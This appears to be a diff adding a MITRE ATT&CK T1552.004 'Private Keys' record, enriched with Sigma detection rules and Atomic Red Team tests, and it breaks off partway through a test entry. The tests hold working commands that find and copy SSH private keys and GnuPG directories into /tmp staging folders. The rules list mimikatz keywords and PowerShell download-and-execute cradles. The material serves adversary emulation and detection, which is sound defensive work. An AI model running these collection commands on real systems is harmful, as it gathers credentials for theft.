@@ -1,0 +1,545 @@
+{
+    "id": "T1552.004",
+    "name": "Private Keys",
+    "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.\nAdversaries may also look in common key directories, such as `~/.ssh` for SSH keys on * nix-based systems or `C:&#92;Users&#92;(username)&#92;.ssh&#92;` on Windows. These private keys can be used to authenticate to [Remote Services](T1021) like SSH or for use in decrypting other collected files such as email.\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](T1056) for keylogging or attempt to [Brute Force](T1110) the passphrase off-line.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "File: File Access, Command: Command Execution",
+    "detection": "Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.",
+    "url": "https://attack.mitre.org/techniques/T1552/004",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1552.004",
+                "atomic_attack_guid": "520ce462-7ca7-441e-b5a5-f8347f632696",
+                "atomic_attack_name": "Private Keys",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Private Keys Reconnaissance Via CommandLine Tools",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_private_keys_recon.yml",
+                        "remote_content": "title: Private Keys Reconnaissance Via CommandLine Tools\nid: 213d6a77-3d55-4ce8-ba74-fcfef741974e\nstatus: test\ndescription: Adversaries may search for private key certificate files on compromised systems for insecurely stored credential\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.004/T1552.004.md\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-07-20\nmodified: 2023-03-06\ntags:\n    - attack.credential-access\n    - attack.t1552.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cmd_cli:\n        CommandLine|contains: 'dir '\n    selection_pwsh_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_pwsh_cli:\n        CommandLine|contains: 'Get-ChildItem '\n    selection_findstr:\n        - Image|endswith: '\\findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_ext:\n        CommandLine|contains:\n            - '.key'\n            - '.pgp'\n            - '.gpg'\n            - '.ppk'\n            - '.p12'\n            - '.pem'\n            - '.pfx'\n            - '.cer'\n            - '.p7b'\n            - '.asc'\n    condition: selection_ext and (all of selection_cmd_* or all of selection_pwsh_* or selection_findstr)\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "File And SubFolder Enumeration Via Dir Command",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_dir_execution.yml",
+                        "remote_content": "title: File And SubFolder Enumeration Via Dir Command\nid: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006\nstatus: test\ndescription: |\n    Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2024-04-14\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: Cmd.Exe\n    selection_cli:\n        CommandLine|contains|windash: 'dir*-s'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Private Keys Discovery",
+                        "rule_link": "https://research.splunk.com/endpoint/5c1c2877-06c0-40ee-a1a2-db71f1372b5b/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1552.004",
+                "atomic_attack_guid": "290df60e-4b5d-4a5e-b0c7-dc5348ea0c86",
+                "atomic_attack_name": "Export Certificates with Mimikatz",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "HackTool - Mimikatz Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
+                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1552.004",
+                "atomic_attack_guid": "336b25bf-4514-4684-8924-474974f28137",
+                "atomic_attack_name": "CertUtil ExportPFX",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "dca1b3e8-e043-4ec8-85d7-867f334b5724",
+                    "1f978c6a-4415-47fb-aca5-736a44d7ca3d",
+                    "2ec1f538-1915-4636-8b38-101cb1efce5e",
+                    "60b508a1-6a5e-46b1-821a-9f7b78752abf",
+                    "213d6a77-3d55-4ce8-ba74-fcfef741974e",
+                    "b2815d0d-7481-4bf0-9b6c-a4c48a94b349",
+                    "aa7a3fce-bef5-4311-9cc1-5f04bb8c308c"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "dca1b3e8-e043-4ec8-85d7-867f334b5724",
+                        "lookup_data": {
+                            "description": "A general detection for processes creating PFX files. This could be an indicator of an adversary exporting a local certificate to a PFX file.",
+                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: A general detection for processes creating PFX files. This could be an\n  indicator of an adversary exporting a local certificate to a PFX file.\ndetection:\n  condition: selection and not 1 of filter*\n  filter:\n    TargetFilename|contains|all:\n    - \\Templates\\Windows\\Windows_TemporaryKey.pfx\n    - \\CMake\\\n  selection:\n    TargetFilename|endswith: .pfx\nfalsepositives:\n- System administrators managing certififcates.\nid: dca1b3e8-e043-4ec8-85d7-867f334b5724\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/07/07\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/14\n- https://threathunterplaybook.com/evals/apt29/detections/6.B.1_6392C9F1-D975-4F75-8A70-433DEDD7F622.html\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.004\ntitle: Suspicious PFX File Creation\n",
+                            "sigma:id": "dca1b3e8-e043-4ec8-85d7-867f334b5724",
+                            "title": "Suspicious PFX File Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1f978c6a-4415-47fb-aca5-736a44d7ca3d",
+                        "lookup_data": {
+                            "description": "Show when private keys are being exported from the device, or when new certificates are installed",
+                            "raw": "author: Austin Clark\ndate: 2019/08/12\ndescription: Show when private keys are being exported from the device, or when new\n  certificates are installed\ndetection:\n  condition: keywords\n  keywords:\n  - crypto pki export\n  - crypto pki import\n  - crypto pki trustpoint\nfalsepositives:\n- Not commonly run by administrators. Also whitelist your known good certificates\nfields:\n- src\n- CmdSet\n- User\n- Privilege_Level\n- Remote_Address\nid: 1f978c6a-4415-47fb-aca5-736a44d7ca3d\nlevel: high\nlogsource:\n  product: cisco\n  service: aaa\nmodified: 2023/01/04\nstatus: test\ntags:\n- attack.credential_access\n- attack.defense_evasion\n- attack.t1553.004\n- attack.t1552.004\ntitle: Cisco Crypto Commands\n",
+                            "sigma:id": "1f978c6a-4415-47fb-aca5-736a44d7ca3d",
+                            "title": "Cisco Crypto Commands",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2ec1f538-1915-4636-8b38-101cb1efce5e",
+                        "lookup_data": {
+                            "description": "A22-108A TraderTraitor North Korean State-Sponsored APT Targets Blockchain Companies",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/2ec1f538-1915-4636-8b38-101cb1efce5e.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1650976786",
+                            "uuid": "2ec1f538-1915-4636-8b38-101cb1efce5e",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "60b508a1-6a5e-46b1-821a-9f7b78752abf",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1552.004",
+                            "mitre-cti:description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.",
+                            "mitre-cti:name": "Private Keys",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Itzik Kotler, SafeBreach'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf', 'type': 'attack-pattern', 'created': '2020-02-04T13:06:49.258Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1552.004', 'url': 'https://attack.mitre.org/techniques/T1552/004'}, {'url': 'https://en.wikipedia.org/wiki/Public-key_cryptography', 'description': 'Wikipedia. (2017, June 29). Public-key cryptography. Retrieved July 5, 2017.', 'source_name': 'Wikipedia Public Key Crypto'}, {'url': 'https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf', 'description': 'Kaspersky Labs. (2014, February 11). Unveiling “Careto” - The Masked APT. Retrieved July 5, 2017.', 'source_name': 'Kaspersky Careto'}, {'url': 'https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/', 'description': 'Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia – Game Over. Retrieved July 5, 2017.', 'source_name': 'Palo Alto Prince of Persia'}], 'modified': '2020-03-29T21:36:36.613Z', 'name': 'Private Keys', 'description': 'Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \\n\\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.\\n\\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\\n\\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Access', 'Command: Command Execution'], 'x_mitre_permissions_required': ['User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "213d6a77-3d55-4ce8-ba74-fcfef741974e",
+                        "lookup_data": {
+                            "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credential",
+                            "raw": "author: frack113\ndate: 2021/07/20\ndescription: Adversaries may search for private key certificate files on compromised\n  systems for insecurely stored credential\ndetection:\n  condition: all of selection_*\n  selection_exe:\n    CommandLine|contains:\n    - 'dir '\n    - 'findstr '\n  selection_ext:\n    CommandLine|contains:\n    - .key\n    - .pgp\n    - .gpg\n    - .ppk\n    - .p12\n    - .pem\n    - .pfx\n    - .cer\n    - .p7b\n    - .asc\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 213d6a77-3d55-4ce8-ba74-fcfef741974e\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.004/T1552.004.md\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.004\ntitle: Discover Private Keys\n",
+                            "sigma:id": "213d6a77-3d55-4ce8-ba74-fcfef741974e",
+                            "title": "Discover Private Keys",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b2815d0d-7481-4bf0-9b6c-a4c48a94b349",
+                        "lookup_data": {
+                            "description": "Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/04/23\ndescription: Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which\n  is in almost all cases a sign of malicious activity\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - Get-Process lsas\n    - ps lsas\n    - gps lsas\nfalsepositives:\n- Unknown\nid: b2815d0d-7481-4bf0-9b6c-a4c48a94b349\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://twitter.com/PythonResponder/status/1385064506049630211\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.004\ntitle: PowerShell Get-Process LSASS\n",
+                            "sigma:id": "b2815d0d-7481-4bf0-9b6c-a4c48a94b349",
+                            "title": "PowerShell Get-Process LSASS",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "aa7a3fce-bef5-4311-9cc1-5f04bb8c308c",
+                        "lookup_data": {
+                            "description": "Detects Commandlet that is used to export certificates from the local certificate store and sometimes used by threat actors to steal private keys from compromised machines",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/04/23\ndescription: Detects Commandlet that is used to export certificates from the local\n  certificate store and sometimes used by threat actors to steal private keys from\n  compromised machines\ndetection:\n  condition: selection and not 1 of filter*\n  filter_moduleexport:\n    ScriptBlockText|contains: CmdletsToExport = @(\n  selection:\n    ScriptBlockText|contains: Export-PfxCertificate\nfalsepositives:\n- Legitimate certificate exports invoked by administrators or users (depends on processes\n  in the environment - filter if unusable)\nid: aa7a3fce-bef5-4311-9cc1-5f04bb8c308c\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/24\nreferences:\n- https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a\n- https://docs.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.004\ntitle: Suspicious Export-PfxCertificate\n",
+                            "sigma:id": "aa7a3fce-bef5-4311-9cc1-5f04bb8c308c",
+                            "title": "Suspicious Export-PfxCertificate",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1552.004",
+                "display_name": "Unsecured Credentials: Private Keys",
+                "atomic_tests": [
+                    {
+                        "name": "Private Keys",
+                        "auto_generated_guid": "520ce462-7ca7-441e-b5a5-f8347f632696",
+                        "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "dir c:\\ /b /s .key | findstr /e .key\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Discover Private SSH Keys",
+                        "auto_generated_guid": "46959285-906d-40fa-9437-5a439accd878",
+                        "description": "Discover private SSH keys on a FreeBSD, macOS or Linux system.\n",
+                        "supported_platforms": [
+                            "linux",
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "search_path": {
+                                "description": "Path where to start searching from.",
+                                "type": "path",
+                                "default": "/"
+                            },
+                            "output_file": {
+                                "description": "Output file containing locations of SSH key files",
+                                "type": "path",
+                                "default": "/tmp/keyfile_locations.txt"
+                            }
+                        },
+                        "executor": {
+                            "command": "find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}\nexit 0\n",
+                            "cleanup_command": "rm #{output_file}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Copy Private SSH Keys with CP",
+                        "auto_generated_guid": "7c247dc7-5128-4643-907b-73a76d9135c3",
+                        "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "search_path": {
+                                "description": "Path where to start searching from.",
+                                "type": "path",
+                                "default": "/"
+                            },
+                            "output_folder": {
+                                "description": "Output folder containing copies of SSH private key files",
+                                "type": "path",
+                                "default": "/tmp/art-staging"
+                            }
+                        },
+                        "executor": {
+                            "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n",
+                            "cleanup_command": "rm -rf #{output_folder}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Copy Private SSH Keys with CP (freebsd)",
+                        "auto_generated_guid": "12e4a260-a7fd-4ed8-bf18-1a28c1395775",
+                        "description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `cp` command.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "search_path": {
+                                "description": "Path where to start searching from.",
+                                "type": "path",
+                                "default": "/"
+                            },
+                            "output_folder": {
+                                "description": "Output folder containing copies of SSH private key files",
+                                "type": "path",
+                                "default": "/tmp/art-staging"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Install GNU cp from coreutils package.\n",
+                                "prereq_command": "if [ ! -x \"$(command -v gcp)\" ]; then exit 1; else exit 0; fi;\n",
+                                "get_prereq_command": "(which pkg && pkg install -y coreutils)\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \\;\n",
+                            "cleanup_command": "rm -rf #{output_folder}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Copy Private SSH Keys with rsync",
+                        "auto_generated_guid": "864bb0b2-6bb5-489a-b43b-a77b3a16d68a",
+                        "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "search_path": {
+                                "description": "Path where to start searching from.",
+                                "type": "path",
+                                "default": "/"
+                            },
+                            "output_folder": {
+                                "description": "Output folder containing copies of SSH private key files",
+                                "type": "path",
+                                "default": "/tmp/art-staging"
+                            }
+                        },
+                        "executor": {
+                            "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\nexit 0\n",
+                            "cleanup_command": "rm -rf #{output_folder}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Copy Private SSH Keys with rsync (freebsd)",
+                        "auto_generated_guid": "922b1080-0b95-42b0-9585-b9a5ea0af044",
+                        "description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `rsync` command.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "search_path": {
+                                "description": "Path where to start searching from.",
+                                "type": "path",
+                                "default": "/"
+                            },
+                            "output_folder": {
+                                "description": "Output folder containing copies of SSH private key files",
+                                "type": "path",
+                                "default": "/tmp/art-staging"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Check if rsync is installed.\n",
+                                "prereq_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n",
+                                "get_prereq_command": "(which pkg && pkg install -y rsync)\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\n",
+                            "cleanup_command": "rm -rf #{output_folder}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Copy the users GnuPG directory with rsync",
+                        "auto_generated_guid": "2a5a0601-f5fb-4e2e-aa09-73282ae6afca",
+                        "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
+                        "supported_platforms": [
+                            "macos",
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "search_path": {
+                                "description": "Path where to start searching from",
+                                "type": "path",
+                                "default": "/"
+                            },
+                            "output_folder": {
+                                "description": "Output folder containing a copy of the .gnupg directory",
+                                "type": "path",
+                                "default": "/tmp/GnuPG"
+                            }
+                        },
+                        "executor": {
+                            "command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\nexit 0\n",
+                            "cleanup_command": "rm -rf #{output_folder}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Copy the users GnuPG directory with rsync (freebsd)",
+                        "auto_generated_guid": "b05ac39b-515f-48e9-88e9-2f141b5bcad0",
+                        "description": "Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging folder using the `rsync` command.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "search_path": {
+                                "description": "Path where to start searching from",
+                                "type": "path",
+                                "default": "/"
+                            },
+                            "output_folder": {
+                                "description": "Output folder containing a copy of the .gnupg directory",
+                                "type": "path",
+                                "default": "/tmp/GnuPG"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Check if rsync is installed.\n",
+                                "prereq_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n",
+                                "get_prereq_command": "(which pkg && pkg install -y rsync)\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\n",
+                            "cleanup_command": "rm -rf #{output_folder}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "ADFS token signing and encryption certificates theft - Local",
+                        "auto_generated_guid": "78e95057-d429-4e66-8f82-0f060c1ac96f",
